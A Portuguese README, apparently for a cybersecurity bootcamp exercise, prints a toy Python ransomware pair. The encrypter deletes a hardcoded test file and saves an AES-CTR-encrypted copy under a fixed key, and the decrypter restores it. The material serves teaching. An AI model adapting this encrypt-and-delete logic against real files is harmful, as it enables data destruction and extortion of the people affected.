# projeto-ransomware-dio

Código para o desafio de projeto __Entendendo um Ransomware na Prática com Python__ do Santander Bootcamp Cibersegurança

## Criando os códigos
1. criando arquivo .txt
`nano testeransomware.txt`

2. encrypter.py
```python
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "testeransomware.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave para criptografar
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```   
   
3. decrypter.py
```python
import os
import pyaes

## abrir o arquivo criptografado
file_name = "testeransomware.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografar o arquivo
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "testeransomware.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```
